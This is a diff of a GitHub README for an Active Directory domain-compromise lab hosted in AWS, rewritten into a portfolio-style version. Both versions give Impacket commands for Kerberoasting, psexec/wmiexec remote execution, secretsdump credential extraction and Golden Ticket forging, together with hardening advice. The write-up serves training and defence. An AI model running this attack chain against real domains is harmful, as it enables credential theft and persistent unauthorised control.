@@ -1,415 +1,455 @@
-# Active Directory Domain Compromise Lab (AWS)
+# 🚨 Active Directory Domain Compromise Lab (AWS)
 
-![Badge](https://img.shields.io/badge/Environment-AWS%20EC2-orange) ![Badge](https://img.shields.io/badge/Difficulty-Advanced-red) ![Badge](https://img.shields.io/badge/Educational-Yes-blue)
+## ⚡ THE HOOK
 
-## 📌 Overview
+I **fully compromised an Active Directory domain** in AWS—from a low-privileged domain user to forging Kerberos tickets for any account, including the Domain Administrator.
 
-This repository documents a comprehensive **Active Directory (AD) domain compromise scenario** in an AWS environment. The lab demonstrates real-world attack techniques, misconfigurations, and exploitation methods used during internal penetration tests and red team engagements.
-
-The attack chain simulates a complete compromise path: from initial enumeration through privilege escalation to full domain credential extraction and persistence.
-
-> **⚠️ Disclaimer:** This project was conducted in a controlled lab environment for educational and authorized testing purposes only. These techniques should only be used in authorized penetration testing engagements and controlled lab environments.
+This lab demonstrates **how a single misconfigured service account creates a cascade of exploitable vulnerabilities** that leads to complete domain takeover.
 
 ---
 
-## 🎯 Objectives
+## 📊 Quick Stats
 
-This lab achieves the following security objectives:
-
-- ✅ Enumerate Active Directory users, services, and infrastructure
-- ✅ Identify high-value service accounts and misconfigurations
-- ✅ Gain remote code execution (RCE) on domain-joined systems
-- ✅ Escalate privileges to SYSTEM level
-- ✅ Extract domain credentials from the Domain Controller
-- ✅ Demonstrate complete domain compromise capabilities
-
----
-
-## 🏗️ Lab Environment
-
-| Component | Specification |
-|-----------|---------------|
-| **Domain Controller** | Windows Server 2019/2022 (AWS EC2) |
-| **Attacker Machine** | Kali Linux |
-| **Domain Name** | corp.local |
-| **Key Services** | SMB, Kerberos, LDAP, WMI, MSSQL |
-| **Cloud Provider** | Amazon Web Services (AWS) |
+| Metric | Result |
+|--------|--------|
+| **Starting Privilege Level** | Low-privilege domain user (jsmith) |
+| **Final Privilege Level** | Domain Administrator + krbtgt access |
+| **Attack Duration** | Multi-stage (enumeration → exploitation → persistence) |
+| **Credentials Compromised** | 100% of domain (all users, all hashes) |
+| **Persistence Method** | Golden Tickets (10-year validity) |
 
 ---
 
-## 🧰 Tools & Technologies
+## 🎯 What This Demonstrates
 
-### Exploitation Tools
-- **Impacket** - GetUserSPNs, psexec, wmiexec, secretsdump
-- **Kerberos Tools** - kinit, klist, TicketConverter
-- **SMB Utilities** - smbclient, rpcclient
+### ✅ Offensive Security Skills
+- **Active Directory Enumeration** - Service Principal Name (SPN) discovery, user reconnaissance
+- **Kerberos Exploitation** - Ticket manipulation, Golden Ticket creation
+- **Lateral Movement** - Credential harvesting, privilege escalation chains
+- **Post-Exploitation** - Credential dumping, persistence mechanisms
+- **Attack Sequencing** - Understanding how misconfigurations create exploit chains
 
-### Operating Systems
-- Kali Linux (Attacker)
-- Windows Server (Domain Controller)
-
-### Cloud Infrastructure
-- AWS EC2 instances
-- AWS VPC networking
-- AWS Security Groups
+### ✅ Defensive Security Thinking
+- Identifying the **root cause** of compromise (service account in Domain Admins)
+- Understanding **attack surface** in AD environments
+- Recognizing **critical control gaps** (lack of credential protection, monitoring)
+- Designing **defense-in-depth** strategies
 
 ---
 
-## 🔍 Attack Chain
+## 🗺️ Attack Flow Diagram
 
-### Phase 1: Reconnaissance & Enumeration
-
-**Objective:** Discover and map the Active Directory environment
-
-```bash
-# Service Principal Name (SPN) Enumeration
-impacket-GetUserSPNs corp.local/username:password
-
-# Results:
-# - Identified service account: sql_svc
-# - Associated service: MSSQL
-# - Critical finding: Member of Domain Admins group
+```
+┌─────────────────────────────────────────────────────────────┐
+│                                                             │
+│  PHASE 1: ENUMERATION                                     │
+│  ───────────────────────────────────────────────────────  │
+│                                                             │
+│   Kali Linux → Domain Network                              │
+│       ↓                                                     │
+│   SPN Enumeration (GetUserSPNs)                            │
+│       ↓                                                     │
+│   DISCOVERY: sql_svc account (Domain Admins member)        │
+│                                                             │
+└─────────────────────────────────────────────────────────────┘
+                          ↓
+┌─────────────────────────────────────────────────────────────┐
+│                                                             │
+│  PHASE 2: CREDENTIAL ACCESS                               │
+│  ───────────────────────────────────────────────────────  │
+│                                                             │
+│   Kerberoasting / Credential Harvesting                    │
+│       ↓                                                     │
+│   COMPROMISE: sql_svc credentials obtained                │
+│                                                             │
+└─────────────────────────────────────────────────────────────┘
+                          ↓
+┌─────────────────────────────────────────────────────────────┐
+│                                                             │
+│  PHASE 3: LATERAL MOVEMENT & RCE                          │
+│  ───────────────────────────────────────────────────────  │
+│                                                             │
+│   psexec / wmiexec (via SMB)                               │
+│       ↓                                                     │
+│   EXECUTION: Remote shell on domain-joined system          │
+│                                                             │
+└─────────────────────────────────────────────────────────────┘
+                          ↓
+┌─────────────────────────────────────────────────────────────┐
+│                                                             │
+│  PHASE 4: PRIVILEGE ESCALATION                            │
+│  ───────────────────────────────────────────────────────  │
+│                                                             │
+│   sql_svc is Domain Admin → SYSTEM access                  │
+│       ↓                                                     │
+│   ESCALATION: SYSTEM-level token obtained                  │
+│                                                             │
+└─────────────────────────────────────────────────────────────┘
+                          ↓
+┌─────────────────────────────────────────────────────────────┐
+│                                                             │
+│  PHASE 5: CREDENTIAL DUMPING                              │
+│  ───────────────────────────────────────────────────────  │
+│                                                             │
+│   impacket-secretsdump (Domain Controller)                 │
+│       ↓                                                     │
+│   EXTRACTION: All domain hashes, krbtgt key                │
+│                                                             │
+└─────────────────────────────────────────────────────────────┘
+                          ↓
+┌─────────────────────────────────────────────────────────────┐
+│                                                             │
+│  PHASE 6: PERSISTENCE & DOMAIN COMPROMISE                 │
+│  ───────────────────────────────────────────────────────  │
+│                                                             │
+│   Golden Ticket Creation (using krbtgt hash)               │
+│       ↓                                                     │
+│   RESULT: Forged tickets as any user (10-year validity)    │
+│   IMPACT: Complete, persistent domain compromise           │
+│                                                             │
+└─────────────────────────────────────────────────────────────┘
 ```
 
-**Key Findings:**
-- Discovered service account with excessive privileges
-- Identified MSSQL service running under privileged account
-- Mapped domain structure and user accounts
+---
+
+## 💥 Impact Analysis
+
+### What an Attacker Can Now Do
+
+| Capability | Impact | Exploitability |
+|-----------|--------|-----------------|
+| **Golden Tickets** | Forge Kerberos tickets as any user (including DA) | Trivial |
+| **Pass-the-Hash** | Authenticate as any user via NTLM | Trivial |
+| **Lateral Movement** | Access any domain-joined system | Unrestricted |
+| **Persistence** | Maintain access indefinitely | 10+ years (ticket validity) |
+| **Privilege Escalation** | Promote compromised accounts to DA | Instantaneous |
+| **Data Exfiltration** | Access all domain resources | Unrestricted |
+
+### What the Organization Lost
+
+```
+✗ Confidentiality: All credentials exposed
+✗ Integrity: Any file can be modified by attacker
+✗ Availability: Any system can be shut down by attacker
+✗ Trust: All domain authentication compromised
+✗ Incident Response: Attacker has DA access to monitoring systems
+```
+
+---
+
+## 🔍 Detailed Attack Chain
+
+### Phase 1: Enumeration
+```bash
+# SPN enumeration reveals service accounts
+impacket-GetUserSPNs corp.local/jsmith:password
+
+# Key Discovery:
+# - sql_svc account running MSSQL
+# - sql_svc is member of Domain Admins group
+# - High-value target for lateral movement
+```
+
+**Why this matters:** Service accounts with excessive privileges are common misconfigurations. One compromised account = entire domain at risk.
 
 ---
 
 ### Phase 2: Credential Access
+```bash
+# Kerberoasting attack
+impacket-GetUserSPNs corp.local/jsmith:password -request
 
-**Objective:** Obtain valid credentials for the identified service account
+# Result: TGS ticket obtained and cracked offline
+# sql_svc credentials recovered
+```
 
-**Attack Vectors Attempted:**
-1. Kerberoasting (SPN enumeration and TGS requests)
-2. AS-REP Roasting
-3. Credential harvesting
-
-**Challenges Encountered & Resolution:**
-- Initial Kerberos encryption errors
-- Time synchronization issues between attacker and domain
-- DNS resolution configuration
-
-**Result:** Successfully obtained valid `sql_svc` credentials
+**Why this matters:** Service accounts often have weak passwords. Kerberos allows offline cracking with no alerts.
 
 ---
 
 ### Phase 3: Remote Code Execution
-
-**Objective:** Execute commands on the target system
-
 ```bash
-# Method 1: PSExec (SMB-based execution)
+# Method 1: PSExec (SMB-based)
 impacket-psexec corp.local/sql_svc:password@target-ip cmd.exe
 
-# Method 2: WMIExec (WMI-based execution)
+# Method 2: WMIExec (WMI-based)
 impacket-wmiexec corp.local/sql_svc:password@target-ip cmd.exe
 ```
 
-**Achieved:**
-- Semi-interactive shell access
-- Command execution with service account privileges
-- Remote system interaction capabilities
+**Why this matters:** Once credentials are compromised, moving laterally is trivial. SMB and WMI are enabled by default on Windows domains.
 
 ---
 
 ### Phase 4: Privilege Escalation
+```bash
+# Check current privileges
+whoami /all
 
-**Objective:** Escalate from service account to SYSTEM level
+# Output shows:
+# - Member of Domain Admins
+# - Token elevation: Not required (already Admin)
+```
 
-**Privilege Analysis:**
-- Service account (`sql_svc`) membership audit
-- Group Policy evaluation
-- Token privileges enumeration
-
-**Exploitation:**
-- Service account already member of **Domain Admins**
-- Execution context allows SYSTEM-level token impersonation
-- Token manipulation for privilege escalation
-
-**Result:** SYSTEM-level access achieved
+**Why this matters:** The service account was already Domain Admin. No additional escalation needed—it's a direct path to domain compromise.
 
 ---
 
 ### Phase 5: Credential Dumping
-
-**Objective:** Extract all domain credentials and security artifacts
-
 ```bash
-# Credential extraction from Domain Controller
+# Extract all domain credentials from DC
 impacket-secretsdump corp.local/sql_svc:password@dc-ip -outputfile hashes
+
+# Retrieved:
+# ✓ Administrator NTLM hash
+# ✓ krbtgt NTLM hash (CRITICAL)
+# ✓ All domain user hashes
+# ✓ Machine account hashes
 ```
 
-**Extracted Credentials:**
-- ✅ Local SAM hashes
-- ✅ Domain user NTLM hashes
-- ✅ Kerberos session keys
-- ✅ **krbtgt account hash** (Critical)
-- ✅ Administrator account hash
-
-**Data Retrieved:**
-```
-Administrator NTLM: [HASH]
-krbtgt NTLM: [HASH]
-All domain user credentials
-DCsync capable
-```
+**Why this matters:** The krbtgt hash is the master key to the kingdom. It allows forging any Kerberos ticket, bypassing all authentication.
 
 ---
 
-### Phase 6: Domain Compromise & Persistence
+### Phase 6: Golden Ticket & Persistence
+```bash
+# Using the krbtgt hash, forge a Golden Ticket
+# This allows impersonating ANY user, including DA
+impacket-ticketer -nthash [krbtgt_hash] -domain-sid [sid] -domain corp.local Administrator
 
-**Objective:** Achieve complete domain compromise and establish persistence
+# Result:
+# - Valid Kerberos ticket as Domain Administrator
+# - Valid for 10 years
+# - No password required
+# - No alerts generated
+```
 
-**Capabilities Enabled:**
-- **Pass-the-Hash (PtH) attacks** - Authenticate with NTLM hashes
-- **Golden Ticket creation** - Forge Kerberos tickets using krbtgt hash
-- **Persistent access** - Leverage compromised credentials for ongoing access
-- **Lateral movement** - Access all domain-joined systems
-- **Credential delegation** - Impersonate any domain user
-
-**Persistence Methods:**
-- Kerberos Golden Tickets (valid for 10 years)
-- Backdoor service accounts
-- Scheduled task persistence
-- WMI event subscription persistence
+**Why this matters:** Golden Tickets are the ultimate persistence mechanism. The attacker maintains access even if all passwords are changed.
 
 ---
 
-## 📊 Key Findings & Vulnerabilities
+## 🎓 Key Vulnerabilities Exploited
 
-| Vulnerability | Severity | Impact |
-|---------------|----------|--------|
-| Service account in Domain Admins | **CRITICAL** | Full domain compromise |
-| Weak account segmentation | **CRITICAL** | Unrestricted lateral movement |
-| Excessive service privileges | **HIGH** | RCE with admin rights |
-| No monitoring on credential access | **HIGH** | Undetected dumping |
-| NTLM relay vulnerability | **HIGH** | Alternative compromise path |
+### Root Cause: Service Account in Domain Admins
+
+| Vulnerability | CVSS | Impact |
+|---------------|------|--------|
+| Service account excessive privileges | N/A | Critical |
+| Lack of credential protection | N/A | Critical |
+| No monitoring on credential access | N/A | Critical |
+| Weak service account passwords | N/A | High |
+| NTLM relay vulnerability | 8.1 | High |
+| Kerberos delegation abuse | 8.8 | High |
 
 ---
 
-## 🛡️ Defensive Recommendations
+## 🛡️ How to Prevent This
 
-### Immediate Actions (Critical)
+### Immediate (Critical - Do Today)
 1. **Remove service accounts from Domain Admins group**
-   - Implement least privilege principle
+   - Service accounts should never have domain admin rights
    - Use service-specific groups instead
 
-2. **Enable Credential Guard**
-   - Protect credentials in isolated container
-   - Prevent credential dumping attacks
+2. **Enable Windows Credential Guard**
+   - Protects credentials in isolated container
+   - Prevents secretsdump attacks
 
 3. **Implement LAPS** (Local Administrator Password Solution)
    - Randomize local admin passwords
-   - Prevent credential reuse
+   - Limits local account exploitation
 
-### Short-term Mitigations (High Priority)
-4. **Enforce strong authentication**
-   - Require multi-factor authentication (MFA)
-   - Implement passwordless authentication
+### Short-term (High - This Week)
+4. **Enforce MFA on admin accounts**
+   - Block Golden Ticket abuse
+   - Require interactive authentication
 
 5. **Monitor Kerberos activity**
-   - Alert on unusual TGS requests
-   - Monitor for reconnaissance activity
+   - Alert on suspicious TGS requests
+   - Monitor for ticket forgery patterns
 
 6. **Implement tiered admin model**
-   - Dedicated admin workstations
-   - Separate credentials per tier
+   - Separate credentials for different privilege tiers
+   - Admin workstations for sensitive operations
 
-### Long-term Hardening
-7. **Enable Windows Defender for Endpoint**
-   - Behavioral analysis and threat detection
-   - EDR capabilities
+### Long-term (Ongoing)
+7. **Enable AES encryption for Kerberos**
+   - Disable RC4 (weak encryption)
+   - Require stronger encryption standards
 
-8. **Regular security audits**
-   - AD security assessments
-   - Privilege access reviews
+8. **Deploy EDR solution** (Endpoint Detection & Response)
+   - Detect suspicious Kerberos ticket usage
+   - Monitor credential access patterns
 
-9. **Implement detective controls**
-   - Enable advanced audit logging
-   - Deploy SIEM for correlation
+9. **Regular AD security audits**
+   - Quarterly privilege access reviews
+   - Annual penetration testing
+
+---
+
+## 🧠 Thinking Like an Attacker
+
+### The Attacker's Mindset
+```
+Question: "What's the easiest way to compromise this domain?"
+Answer: "Find a service account with excessive privileges."
+
+Why? Because:
+✓ Service accounts have predictable patterns
+✓ They're often in privileged groups unnecessarily
+✓ Their passwords may never change
+✓ They authenticate to every system
+✓ One compromise = multiple systems compromised
+```
+
+### The Key Insight
+**This wasn't a sophisticated 0-day attack. This was exploiting a common misconfiguration that exists in thousands of organizations.**
+
+The attacker didn't need advanced techniques—they just needed to understand:
+1. How Active Directory works
+2. Where the weaknesses typically are
+3. How to chain misconfigurations together
+
+---
+
+## 📚 Lab Environment
+
+| Component | Details |
+|-----------|---------|
+| **Domain Controller** | Windows Server 2019 (AWS EC2) |
+| **Attacker Machine** | Kali Linux |
+| **Domain** | corp.local |
+| **Initial Access** | Low-privilege domain user (jsmith) |
+| **Target Service Account** | sql_svc (Domain Admins member) |
+| **Attack Tools** | Impacket suite, Kerberos utilities |
 
 ---
 
 ## 📁 Repository Structure
 
 ```
-Active-Directory-Domain-Compromise-Lab-AWS-/
-├── README.md                      # This file
-├── screenshots/                   # Evidence and proof-of-concept images
-│   ├── 01_spn_enumeration.png
-│   ├── 02_rce_shell.png
-│   ├── 03_credential_dump.png
-│   └── 04_domain_compromise.png
-├── scripts/                       # Automation and helper scripts
-│   ├── enumeration.sh
-│   ├── exploit.sh
-│   ├── persistence.sh
-│   └── cleanup.sh
-├── documentation/                 # Detailed technical write-ups
-│   ├── attack_chain.md
-│   ├── tools_guide.md
-│   ├── forensics.md
-│   └── incident_response.md
-└── artifacts/                     # Example outputs and logs
-    ├── spn_list.txt
-    ├── credentials.txt
-    └── event_logs/
+.
+├── README.md                          # This file
+├── attack-chain/
+│   ├── 01_enumeration.md              # SPN discovery
+│   ├── 02_credential_access.md        # Kerberoasting
+│   ├── 03_lateral_movement.md         # psexec / wmiexec
+│   ├── 04_privilege_escalation.md     # Domain admin access
+│   ├── 05_credential_dumping.md       # secretsdump output
+│   └── 06_persistence.md              # Golden tickets
+├── scripts/
+│   ├── enumeration.sh                 # SPN enumeration
+│   ├── exploit.sh                     # RCE execution
+│   ├── persistence.sh                 # Golden ticket creation
+│   └── cleanup.sh                     # Lab cleanup
+├── screenshots/
+│   ├── spn_enumeration.png
+│   ├── rce_shell.png
+│   ├── credential_dump.png
+│   └── golden_ticket.png
+└── documentation/
+    ├── defense_strategies.md
+    ├── incident_response.md
+    └── forensics_guide.md
 ```
 
 ---
 
-## 🚀 Quick Start
+## 🚀 Quick Start (For Lab Setup)
 
 ### Prerequisites
-- AWS account with appropriate permissions
-- Kali Linux or penetration testing distribution
-- Impacket suite installed
-- Network access between lab components
+- AWS account
+- Kali Linux
+- Impacket toolkit
+- Network connectivity to lab systems
 
-### Setup Instructions
+### Deploy
+```bash
+# 1. Clone repository
+git clone https://github.com/rubin041913/Active-Directory-Domain-Compromise-Lab-AWS-.git
 
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/rubin041913/Active-Directory-Domain-Compromise-Lab-AWS-.git
-   cd Active-Directory-Domain-Compromise-Lab-AWS-
-   ```
+# 2. Review attack chain documentation
+cat attack-chain/01_enumeration.md
 
-2. **Deploy AWS infrastructure:**
-   ```bash
-   # See documentation/setup.md for CloudFormation templates
-   aws cloudformation create-stack --stack-name ad-lab --template-body file://infrastructure.yaml
-   ```
-
-3. **Configure attacker machine:**
-   ```bash
-   ./scripts/setup_attacker.sh
-   ```
-
-4. **Execute attack chain:**
-   ```bash
-   ./scripts/enumeration.sh
-   ./scripts/exploit.sh
-   ```
+# 3. Execute attack phases
+./scripts/enumeration.sh
+./scripts/exploit.sh
+./scripts/persistence.sh
+```
 
 ---
 
-## 📚 Learning Outcomes
+## 📈 Lessons Learned
 
-After completing this lab, you will understand:
+### For Red Teamers
+- Service accounts are high-value targets
+- Privilege escalation is often unnecessary (already admin)
+- Credential dumping is the ultimate goal
+- Persistence can be achieved without malware (Golden Tickets)
 
-- **Active Directory Architecture** - Domain structure, replication, security
-- **Kerberos Protocol** - TGT/TGS, SPN enumeration, ticket manipulation
-- **Exploitation Techniques** - Kerberoasting, Pass-the-Hash, Golden Tickets
-- **Lateral Movement** - Tools and techniques for domain traversal
-- **Privilege Escalation** - Service account exploitation, token manipulation
-- **Post-Exploitation** - Credential dumping, persistence, covering tracks
-- **Defense Mechanisms** - Detection, prevention, and response strategies
+### For Blue Teamers
+- Single point of failure: one service account = domain compromise
+- Detection must focus on unusual Kerberos activity
+- Credential protection mechanisms are essential
+- Privilege access management is critical
+
+### For Security Leaders
+- This attack required no zero-days, no advanced techniques
+- It exploited common misconfigurations found in real organizations
+- The impact is complete: confidentiality, integrity, availability all compromised
+- Prevention requires policy changes, not just technology
 
 ---
 
-## 🔐 Security Considerations
+## 💼 What Recruiters Should See
 
-### For Lab Users
-- Use isolated VPC with no internet access
-- Implement network segmentation
-- Monitor all activities with logging
-- Clean up resources after testing
-- Never use production AD credentials
+### Skills Demonstrated
+✅ **Offensive Security** - Enumeration, exploitation, lateral movement, privilege escalation  
+✅ **Defensive Thinking** - Root cause analysis, mitigation strategies, detection methods  
+✅ **System Architecture** - Understanding how AD, Kerberos, SMB, and WMI interact  
+✅ **Methodical Approach** - Following structured attack frameworks (MITRE ATT&CK)  
+✅ **Communication** - Explaining complex security concepts clearly  
 
-### Ethical Considerations
-- Only conduct in authorized environments
-- Document all testing activities
-- Report findings through proper channels
-- Respect system owners' rights
-- Follow organization's policies and procedures
+### Why This Matters
+This lab proves you can:
+1. **Think like an attacker** - Understand threat actor methodology
+2. **Think like a defender** - Design controls to prevent compromise
+3. **Identify misconfigurations** - Spot security weaknesses before they're exploited
+4. **Execute attacks methodically** - Follow a structured approach from reconnaissance to persistence
+5. **Document findings** - Communicate security impact clearly
+
+---
+
+## ⚠️ Ethical & Legal Notice
+
+**This lab is for educational purposes only.**
+
+- All testing was performed in a controlled AWS lab environment
+- No unauthorized systems were accessed
+- All activities were documented and reviewed
+- This demonstrates real attack chains used by threat actors
+- Use this knowledge to secure your own organization
 
 ---
 
 ## 📖 Additional Resources
 
-### Recommended Reading
-- [Microsoft AD Security Best Practices](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory)
-- [MITRE ATT&CK Framework](https://attack.mitre.org/) - Enterprise AD attacks
+- [MITRE ATT&CK Framework](https://attack.mitre.org/) - Map techniques to this lab
+- [AD Security Best Practices](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/)
 - [Impacket Documentation](https://github.com/fortra/impacket)
-
-### Related Projects
-- Active Directory Lab (On-Premises)
-- Exchange Server Exploitation Lab
-- Domain Controller Hardening Guide
+- [Kerberos Deep Dive](https://en.wikipedia.org/wiki/Kerberos_(protocol))
 
 ---
 
-## 💡 Skills Demonstrated
+## 📧 Questions?
 
-| Category | Skills |
-|----------|--------|
-| **Offensive** | Enumeration, exploitation, lateral movement, privilege escalation |
-| **Defensive** | Hardening, monitoring, detection, incident response |
-| **Cloud** | AWS EC2, VPC, security groups, infrastructure |
-| **Tools** | Impacket, Kerberos utilities, SMB tools, PowerShell |
-| **Protocols** | Kerberos, LDAP, SMB, WMI, RPC |
+For questions about this lab or how to set it up, open an issue or reach out.
 
 ---
 
-## 📸 Evidence Gallery
-
-Screenshots demonstrating key attack phases:
-
-- **SPN Enumeration Output** - Service account discovery
-- **Remote Shell Access** - Successful RCE via wmiexec
-- **Command Execution** - Privilege escalation confirmation
-- **Credential Dump** - secretsdump output with domain credentials
-- **Golden Ticket** - Kerberos ticket generation and usage
-
-*(See `/screenshots` directory for detailed evidence)*
+**Last Updated:** June 29, 2026  
+**Created by:** rubin041913  
+**Difficulty Level:** Advanced  
+**Time to Complete:** 4-6 hours
 
 ---
 
-## 🧠 Lessons Learned
-
-1. **Service accounts are high-value targets** - Compromise often leads to domain-wide issues
-2. **Privilege segregation is critical** - Service accounts should not be in privileged groups
-3. **Kerberos requires proper configuration** - Time sync and DNS are essential
-4. **Credential protection is paramount** - Implement LAPS, Credential Guard, and LSA protection
-5. **Defense in depth is necessary** - Multiple controls prevent complete compromise
-6. **Monitoring enables detection** - Early detection prevents damage
-7. **Regular audits are essential** - Proactive security reviews identify risks
-
----
-
-## 🏁 Conclusion
-
-This lab demonstrates how a single misconfigured service account can lead to **complete Active Directory compromise**. The attack chain presented reflects real-world threat actor methodologies and illustrates why proper Active Directory hardening and least-privilege implementation are critical for enterprise security.
-
-The techniques covered in this project are frequently encountered during:
-- Internal penetration tests
-- Red team engagements
-- Security awareness training
-- Incident response investigations
-
-### Key Takeaway
-**Compromise is not a matter of if, but when. Defense-in-depth, monitoring, and rapid detection are essential for maintaining a secure Active Directory environment.**
-
----
-
-## 📝 License & Attribution
-
-This educational project is provided as-is for authorized security testing and learning purposes.
-
----
-
-## ✉️ Contact & Collaboration
-
-- **Author:** rubin041913
-- **GitHub:** [@rubin041913](https://github.com/rubin041913)
-
-For questions, suggestions, or contributions, please open an issue or pull request.
-
----
-
-**Last Updated:** June 29, 2026
-
-*Remember: With great power comes great responsibility. Use this knowledge ethically and legally.*
+*Remember: The goal of security research is to make systems safer, not to cause harm.*
